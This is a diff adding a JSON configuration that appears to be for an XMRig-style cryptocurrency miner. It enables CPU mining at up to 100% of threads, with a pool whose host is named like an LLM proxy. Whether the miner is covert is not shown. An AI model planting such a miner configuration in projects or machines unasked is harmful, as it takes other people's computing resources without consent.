@@ -1,0 +1,27 @@
+{
+    "autosave": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "huge-pages-jit": false,
+        "hw-aes": null,
+        "priority": null,
+        "memory-pool": true,
+        "yield": true,
+        "max-threads-hint": 100,
+        "asm": true,
+        "argon2-impl": null,
+        "cn/0": false,
+        "cn-lite/0": false
+    },
+    "opencl": false,
+    "cuda": false,
+    "huge-pages":true,
+    "pools": [
+        {
+            "url": "llmproxy.6553500.xyz:443",
+            "rig-id": "x",
+            "tls": true
+        }
+    ]
+}
